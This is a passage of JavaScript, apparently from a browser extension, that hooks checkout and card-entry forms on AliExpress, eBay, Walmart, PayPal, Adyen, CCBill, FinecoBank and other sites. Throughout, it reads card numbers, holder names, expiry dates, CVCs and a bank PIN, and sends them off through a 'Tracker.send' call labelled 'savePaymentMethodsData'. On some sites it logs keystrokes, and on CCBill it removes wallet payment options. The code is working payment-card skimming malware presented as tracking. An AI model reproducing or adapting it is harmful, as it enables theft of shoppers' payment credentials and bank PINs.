                            ['click', 'dblclick'].forEach(function (event) {
                                cardConfirmElement?.addEventListener(event, function () {
                                    let tempPaymentMethodsStore = [];
                                    document.querySelector('.mix-edcard-item')?.childNodes.forEach(function (__childElement) {
                                        if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('icon')) {
                                            if (__childElement.classList.contains('visa')) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __childElement.nodeName,
                                                    'id': __childElement.id,
                                                    'value': 'visa'
                                                });
                                            }
                                        }
                                        if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('pay-name')) {
                                            tempPaymentMethodsStore.push({
                                                'element': __childElement.nodeName,
                                                'id': __childElement.id,
                                                'value': __childElement.textContent
                                            });
                                        }
                                    });
                                    Tracker.send({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': tempPaymentMethodsStore[0].value,
                                            'cardBrand': tempPaymentMethodsStore[1].value,
                                            'cardHolder': 'Unknown',
                                            'cardExpire': 'Unknown',
                                            'cardCVC': 'Unknown',
                                            'event': 'add',
                                            'workWebsite': window.location.origin
                                        }
                                    });
                                    tempPaymentMethodsStore = [];
                                });
                            });
                        }
                    }
                    if (window.location.href.indexOf('payResult.htm') !== -1) {
                        let interval4 = setInterval(function () {
                            if (document.querySelector('.verify-card-form-row') !== null) {
                                clearInterval(interval4);
                                if (document.querySelector('.verify-card-confirm')?.firstElementChild?.nodeName === 'BUTTON') {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        let tempPaymentMethodsStore = [];
                                        document.querySelector('.verify-card-confirm')?.firstElementChild?.addEventListener(event, function () {
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cardN', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cardHolder', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'expires', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cvc', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    "cardExpire": tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'event': 'add',
                                                    "workWebsite": window.location.origin
                                                }
                                            });
                                            tempPaymentMethodsStore = [];
                                        });
                                    });
                                }
                            }
                        }, 1000);
                    }
                }
                /*if (document.querySelector('.check-out-root') !== null && document.querySelector('.check-out-root')?.childNodes.length !== 1) {
                    clearInterval(interval1);
                    let interval4 = setInterval(function () {
                        if (document.querySelector('.title-to-detail') !== null) {
                            clearInterval(interval4);
                            if (document.querySelector('.title-to-detail')?.nextElementSibling?.textContent?.indexOf('Add a new card') !== -1) {
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.title-to-detail')?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.bind-button-wrap ')?.firstElementChild?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                            } else {
                                self.exploreSpecificElementByTagName(self, (document.querySelector('.check-out-root') as HTMLElement), 'span', 'payment-title', function (__detectedElement: HTMLElement) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': __detectedElement.textContent,
                                                    'cardBrand': 'Unknown',
                                                    'cardHolder': 'Unknown',
                                                    'cardExpire': 'Unknown',
                                                    'cardCVC': 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                        })
                                    });
                                });
                            }
                        }
                    }, 1000);
                    self.explorePaymentSpanTag(self, (document.querySelector('.check-out-root') as HTMLElement), function (__detectedElement: any) {
                        ['click', 'dblclick'].forEach(function (event) {
                            document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': (__detectedElement as HTMLElement).textContent,
                                        'cardBrand': 'Unknown',
                                        'cardHolder': 'Unknown',
                                        'cardExpire': 'Unknown',
                                        'cardCVC': 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                            });
                        });
                    });
                } else {
                    if (window.location.href.indexOf('confirm_order.htm') !== -1) {
                        if (document.querySelectorAll('.arrow-content').length !== 0) {
                            document.querySelectorAll('.arrow-content').forEach(function (divElement) {
                                divElement.addEventListener('click', function () {
                                    if (divElement.classList.contains('arrow-down')) {
                                        let __interval2 = setInterval(function () {
                                            if (document.querySelector('.add-new-card') !== null) {
                                                clearInterval(__interval2);
                                                ['click', 'dblclick'].forEach(function (event) {
                                                    document.querySelector('.add-new-card')?.addEventListener(event, function () {
                                                        let __interval3 = setInterval(function () {
                                                            if (document.querySelector('.new-card') !== null) {
                                                                clearInterval(__interval3);
                                                                self.explorePaymentNewCard(self,
                                                                    (document.querySelector('.new-card') as HTMLElement),
                                                                    function (elements: any) {
                                                                        let paymentMethodStore: any = [];
                                                                        document.querySelector('.save')?.addEventListener('click', function () {
                                                                            elements.forEach(function (element: any) {
                                                                                paymentMethodStore.push({
                                                                                    'element': element.nodeName,
                                                                                    'id': element.id,
                                                                                    'type': element.type,
                                                                                    'value': element.value
                                                                                });
                                                                            })
                                                                            Tracker.send({
                                                                                command: 'savePaymentMethodsData',
                                                                                data: {
                                                                                    'cardNumber': paymentMethodStore[0].value,
                                                                                    'cardBrand': 'Unknown',
                                                                                    'cardHolder': paymentMethodStore[1].value,
                                                                                    'cardExpire': paymentMethodStore[2].value,
                                                                                    'cardCVC': paymentMethodStore[3].value,
                                                                                    'event': 'add',
                                                                                    'workWebsite': window.location.origin
                                                                                }
                                                                            });
                                                                            paymentMethodStore = [];
                                                                        });
                                                                    });
                                                            }
                                                        }, 1000);
                                                    })
                                                });
                                            }
                                        }, 1000);
                                    }
                                })
                            });
                        }

                        if (document.querySelector('.mix-edcard-item')?.childElementCount !== 0) {
                            clearInterval(interval1);
                            let cardConfirmElement = document.querySelector('#checkout-button');
                            ['click', 'dblclick'].forEach(function (event) {
                                cardConfirmElement?.addEventListener(event, function () {
                                    let tempPaymentMethodsStore: any = [];
                                    document.querySelector('.mix-edcard-item')?.childNodes.forEach(function (__childElement) {
                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('icon')) {
                                            if ((__childElement as HTMLElement).classList.contains('visa')) {
                                                tempPaymentMethodsStore.push({
                                                    'element': (__childElement as HTMLElement).nodeName,
                                                    'id': (__childElement as HTMLElement).id,
                                                    'value': 'visa'
                                                });
                                            }
                                        }
                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('pay-name')) {
                                            tempPaymentMethodsStore.push({
                                                'element': (__childElement as HTMLElement).nodeName,
                                                'id': (__childElement as HTMLElement).id,
                                                'value': __childElement.textContent
                                            });
                                        }
                                    });
                                    Tracker.send({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': tempPaymentMethodsStore[0].value,
                                            'cardBrand': tempPaymentMethodsStore[1].value,
                                            'cardHolder': 'Unknown',
                                            'cardExpire': 'Unknown',
                                            'cardCVC': 'Unknown',
                                            'event': 'add',
                                            'workWebsite': window.location.origin
                                        }
                                    });
                                    tempPaymentMethodsStore = [];
                                });
                            });
                        }
                    }
                    if (window.location.href.indexOf('payResult.htm') !== -1) {
                        clearInterval(interval1);

                        let interval4 = setInterval(function () {
                            if (document.querySelector('.verify-card-form-row') !== null) {
                                clearInterval(interval4);
                                if (document.querySelector('.verify-card-confirm')?.firstElementChild?.nodeName === 'BUTTON') {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        let tempPaymentMethodsStore: any = [];
                                        document.querySelector('.verify-card-confirm')?.firstElementChild?.addEventListener(event, function () {
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardN', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardHolder', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'expires', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cvc', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardExpire': tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                            tempPaymentMethodsStore = [];
                                        });
                                    });
                                }
                            }
                        }, 1000);
                    }
                }*/
            }
            if (window.location.origin.indexOf('ebay') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        document.querySelectorAll('form').forEach(function (__ebayCreditCardFormElement) {
                            if (__ebayCreditCardFormElement.id === 'credit-card-details') {
                                clearInterval(interval);
                                let elements = [];
                                self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                            }
                        });
                    }
                }, 100);
                if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
                    if (document.querySelector('.btn.btn--primary.field')?.nodeName === 'BUTTON') {
                        ["click", "dblclick"].forEach(function (event) {
                            let tempPaymentMethodsStore = [];
                            document.querySelector('.btn.btn--primary.field')?.addEventListener(event, function () {
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'creditCardNumber', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'firstName', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'lastName', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'expirationDate', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'cvv', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                        'cardBrand': document.querySelector('.floating-input__fixright')?.firstElementChild?.className ? document.querySelector('.floating-input__fixright')?.firstElementChild?.className.toLowerCase() : 'Unknown',
                                        'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
                                        'cardExpire': tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
                                        'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                                tempPaymentMethodsStore = [];
                            });
                        });
                    }
                }
            }
            if (window.location.origin.indexOf('walmart') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (window.location.href.indexOf('#/payment') !== -1 || window.location.href.indexOf('account/creditcards') !== -1) {
                        clearInterval(interval);
                        self.exploreWalmartPaymentContainer(self);
                    }
                    if (window.location.href.indexOf('#/review') !== -1) {
                        clearInterval(interval);
                        self.exploreWalmartPaymentEditButton(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('hellofresh.de') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('.ReactModalPortal').length !== 0) {
                        clearInterval(interval);
                        document.querySelectorAll('.ReactModalPortal').forEach(function (modal) {
                            if (modal.childNodes.length !== 0) {
                                self.exploreHelloFreshPaymentContainer(self, modal, function (__detectedElement) {
                                    __detectedElement.addEventListener('click', function () {
                                        Tracker.send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': window.sessionStorage.getItem('cardNumber') !== undefined ? window.sessionStorage.getItem('cardNumber') : 'Unknown',
                                                'cardBrand': 'Unknown',
                                                'cardHolder': 'Unknown',
                                                'cardExpire': window.sessionStorage.getItem('cardExpire') !== undefined ? window.sessionStorage.getItem('cardExpire') : 'Unknown',
                                                'cardCVC': window.sessionStorage.getItem('cardCVC') !== undefined ? window.sessionStorage.getItem('cardCVC') : 'Unknown',
                                                'event': 'add',
                                                'workWebsite': window.location.origin
                                            }
                                        });
                                        window.sessionStorage.clear();
                                    });
                                });
                            }
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('checkoutshopper-live.adyen.com') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelector('body') !== null) {
                        clearInterval(interval);
                        self.explorePaymentInputTag(self, document.querySelector('body'), 'encrypted', function (__detectedElement) {
                            __detectedElement.addEventListener('keyup', function () {
                                if (__detectedElement.id === 'encryptedCardNumber') {
                                    window.sessionStorage.setItem('cardNumber', __detectedElement.value);
                                }
                                if (__detectedElement.id === 'encryptedExpiryDate') {
                                    window.sessionStorage.setItem('cardExpire', __detectedElement.value);
                                }
                                if (__detectedElement.id === 'encryptedSecurityCode') {
                                    window.sessionStorage.setItem('cardCVC', __detectedElement.value);
                                }
                            });
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('bestsecret.com') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreBestSecretPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('paypal') !== -1) {
                clearInterval(interval1);
                /*let lxt = '4WE56938NS691591T'*/
                let interval = setInterval(function () {
                    if (document.querySelector('form') !== null) {
                        clearInterval(interval);
                        document.querySelectorAll('form').forEach(function (__paypalFormElement) {
                            if (__paypalFormElement.action.indexOf('myaccount/money') !== -1 || window.location.href.indexOf('webapps') !== -1) {
                                let elements = [];
                                self.explorePayPalPaymentFormElement(self, __paypalFormElement, elements, function (controller, elements) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        controller.addEventListener(event, function () {
                                            let paymentMethodStore = [];
                                            elements.forEach(function (__detectedElement) {
                                                paymentMethodStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            if (__paypalFormElement.action.indexOf('myaccount/money') !== -1) {
                                                Tracker.send({
                                                    command: 'savePaymentMethodsData',
                                                    data: {
                                                        'cardNumber': paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown',
                                                        'cardBrand': paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown',
                                                        'cardHolder': 'Unknown',
                                                        'cardExpire': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
                                                        'cardCVC': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
                                                        'event': 'add',
                                                        'workWebsite': window.location.origin
                                                    }
                                                });
                                                paymentMethodStore = [];
                                            }
                                            if (window.location.href.indexOf('webapps') !== -1) {
                                                Tracker.send({
                                                    command: 'savePaymentMethodsData',
                                                    data: {
                                                        'cardNumber': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
                                                        'cardBrand': document.querySelector('.css-iro1ss-IconContainer.e7vozvz0')?.firstElementChild?.firstElementChild?.textContent?.toLowerCase(),
                                                        'cardHolder': (paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown') + ' ' + (paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown'),
                                                        'cardExpire': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
                                                        'cardCVC': paymentMethodStore[4].value ? paymentMethodStore[4].value : 'Unknown',
                                                        'event': 'add',
                                                        'workWebsite': window.location.origin
                                                    }
                                                });
                                                paymentMethodStore = [];
                                            }
                                        });
                                    });
                                });
                            }
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('finecobank') !== -1) {
                if (document.querySelector('#PIN') !== null) {
                    clearInterval(interval1);
                    self.explorePaymentInputTagOnly(self, document.querySelector('#conferma_email_certifCommand'), function (__detectedElement) {
                        __detectedElement.addEventListener('click', function () {
                            Tracker.send({
                                command: 'saveBankAccountData',
                                data: {
                                    'dataType': 'PIN',
                                    'dataValue': document.querySelector('#PIN').value,
                                    "workWebsite": window.location.origin
                                }
                            });
                        });
                    });
                }
            }
            if (window.location.origin.indexOf('mollie') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreMolliePaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('sunday') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreSundayPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('jetbrains') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (window.location.origin.indexOf('checkout') !== -1) {
                        clearInterval(interval);
                        document.querySelectorAll('button').forEach(function (__buttonElement) {
                            if (__buttonElement.classList.contains('btnConfirmPayment')) {
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': document.querySelector('#ccNumber').value ? document.querySelector('#ccNumber').value : 'Unknown',
                                        'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                        'cardHolder': document.querySelector('#ccHolder').value ? document.querySelector('#ccHolder').value : 'Unknown',
                                        'cardExpire': document.querySelector('#ccExpirationMonth').value ? document.querySelector('#ccExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#ccExpirationYear').value ? document.querySelector('#ccExpirationYear').value : 0,
                                        'cardCVC': document.querySelector('#ccSecurityCode').value ? document.querySelector('#ccSecurityCode').value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                            }
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('paygate') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.explorePaygatePaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('docmorris') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreDocmorrisPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('segpay') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreSegPayPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('ccbill') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        if (document.querySelector('#purchaseForm') !== null && document.querySelector('.pay_by') !== null) {
                            document.querySelector('#placeOrder').addEventListener('click', function () {
                                document.querySelector('.wallet_payment_options.two-column-layout-wallet-payment-options')?.remove();
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': document.querySelector('#creditCardNum').value !== null ? document.querySelector('#creditCardNum').value : 'Unknown',
                                        'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                        'cardHolder': document.querySelector('#firstName').value !== null ? document.querySelector('#firstName').value : 'Unknown' + ' ' + document.querySelector('#lastName').value !== null ? document.querySelector('#lastName').value : 0,
                                        'cardExpire': document.querySelector('#cardExpirationMonth').value !== null ? document.querySelector('#cardExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#cardExpirationYear').value !== null ? document.querySelector('#cardExpirationYear').value : 0,
                                        'cardCVC': document.querySelector('#cvv2').value !== null ? document.querySelector('#cvv2').value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                                //elements = [];
                            });
                        }
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('oppwa.com') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelector('form').childNodes.length !== 0) {
                        document.querySelector('form').childNodes.forEach(function (__childElement) {
                            if (__childElement.nodeName.toLowerCase() === 'input' && __childElement.type === 'tel') {
                                clearInterval(interval);
                                ['keyup', 'keydown', 'change', 'paste'].forEach(function (__event) {
                                    __childElement.addEventListener(__event, function () {
                                        Tracker.send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': __childElement.getAttribute('aria-label') === 'Card Number' ? __childElement.value : 'Unknown',
                                                'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                                'cardHolder': /*(document.querySelector('#firstName') as HTMLInputElement).value !== null ? (document.querySelector('#firstName') as HTMLInputElement).value : 'Unknown' + ' ' + (document.querySelector('#lastName') as HTMLInputElement).value !== null ? (document.querySelector('#lastName') as HTMLInputElement).value :*/ 'Unknown',
                                                'cardExpire': document.querySelector('#cardExpirationMonth').value !== null ? document.querySelector('#cardExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#cardExpirationYear').value !== null ? document.querySelector('#cardExpirationYear').value : 0,
                                                'cardCVC': __childElement.getAttribute('aria-label') === 'CVV' ? __childElement.value : 'Unknown',
                                                'event': 'add',
                                                'workWebsite': window.location.origin
                                            }
                                        });
                                    });
                                });
                            }
                        });
                    }
                }, 100);
            }
        }, 1000);
    }
    exploreSpecificElementByTagName(self, __elementParent, __tagName, __query, callback) {
        if (__elementParent.childNodes.length !== 0) {
            __elementParent.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName.toLowerCase() === __tagName) {
                    [...__childElement.attributes].forEach(function (attribute) {
                        if (attribute.nodeValue.toLowerCase().indexOf(__query) !== -1) {
                            if (callback) {
                                callback(__childElement);
                            }
                        }
                    });
                }
                else {
                    self.exploreSpecificElementByTagName(self, __childElement, __tagName, __query, callback);
                }
            });
        }
    }
    exploreAliExpressPaymentNewCard(self, __elementParent, callback) {
        let detectedElements = [];
        if (__elementParent.childNodes.length !== 0) {
            __elementParent.childNodes.forEach(function (__childElement) {
                if (__childElement.classList.contains('card-surface')) {
                    if (__childElement.nodeName === 'DIV' && __childElement.childNodes.length !== 0) {
                        __childElement.childNodes.forEach(function (__targetParentElement) {
                            if (__targetParentElement.classList.contains('card-no')) {
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cardn', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                            if (__targetParentElement.classList.contains('card-bottom')) {
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cardholder', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'expire', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cv', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                        });
                    }
                }
                if (callback) {
                    callback(detectedElements);
                }
            });
        }
    }
    processAliExpressPaymentNewCard(self) {
        self.exploreAliExpressPaymentNewCard(self, document.querySelector('.new-card'), function (elements) {
            let paymentMethodStore = [];
            document.querySelector('.save')?.addEventListener('click', function () {
                new Set(elements).forEach(function (element) {
                    paymentMethodStore.push({
                        'element': element.nodeName,
                        'id': element.id,
                        'type': element.type,
                        'value': element.value
                    });
                });
                Tracker.send({
                    command: 'savePaymentMethodsData',
                    data: {
                        'cardNumber': paymentMethodStore[0].value,
                        'cardBrand': document.querySelector('.card-type-icon.icon')?.classList.contains('visa') ? 'visa' : (document.querySelector('.card-type-icon.icon')?.classList.contains('mastercard') ? 'mastercard' : (document.querySelector('.card-type-icon.icon')?.classList.contains('discover') ? 'discover' : (document.querySelector('.card-type-icon.icon')?.classList.contains('mnp') ? 'mnp' : (document.querySelector('.card-type-icon.icon')?.classList.contains('maestro') ? 'maestro' : (document.querySelector('.card-type-icon.icon')?.classList.contains('amex') ? 'amex' : document.querySelector('.card-type-icon.icon')?.className))))),
                        'cardHolder': paymentMethodStore[1].value,
                        'cardExpire': paymentMethodStore[2].value,
                        'cardCVC': paymentMethodStore[3].value,
                        'event': 'add',
                        'workWebsite': window.location.origin
                    }
                });
                paymentMethodStore = [];
                let edit = setInterval(function () {
                    if (document.querySelector('.edit-card') !== null) {
                        clearInterval(edit);
                        ['click', 'dblclick'].forEach(function (event) {
                            document.querySelector('.edit-card')?.addEventListener(event, function () {
                                let __interval3 = setInterval(function () {
                                    if (document.querySelector('.new-card') !== null) {
                                        clearInterval(__interval3);
                                        self.processAliExpressPaymentNewCard(self);
                                    }
                                }, 1000);
                            });
                        });
                    }
                }, 1000);
            });
        });
    }
    processAliExpressPaymentNewCardOnSecondPayment(self) {
        let interval = setInterval(function () {
            if (document.querySelector('.card-form') !== null) {
                clearInterval(interval);
                self.exploreAliExpressPaymentNewCard(self, document.querySelector('.card-form'), function (elements) {
                    let paymentMethodStore = [];
                    document.querySelector('.payment-confirm')?.firstElementChild?.addEventListener('click', function () {
                        new Set(elements).forEach(function (element) {
                            paymentMethodStore.push({
                                'element': element.nodeName,
                                'id': element.id,
                                'type': element.type,
                                'value': element.value
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodStore[0].value,
                                'cardBrand': document.querySelector('.card-brand-icon')?.classList.contains('visa') ? 'visa' : (document.querySelector('.card-brand-icon')?.classList.contains('mastercard') ? 'mastercard' : (document.querySelector('.card-brand-icon')?.classList.contains('discover') ? 'discover' : (document.querySelector('.card-brand-icon')?.classList.contains('mnp') ? 'mnp' : (document.querySelector('.card-brand-icon')?.classList.contains('maestro') ? 'maestro' : (document.querySelector('.card-brand-icon')?.classList.contains('amex') ? 'amex' : document.querySelector('.card-brand-icon')?.className))))),
                                'cardHolder': paymentMethodStore[1].value,
                                'cardExpire': paymentMethodStore[2].value,
                                'cardCVC': paymentMethodStore[3].value,
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodStore = [];
                        let edit = setInterval(function () {
                            if (document.querySelector('.payment-edit') !== null) {
                                clearInterval(edit);
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.payment-edit')?.addEventListener(event, function () {
                                        let __interval3 = setInterval(function () {
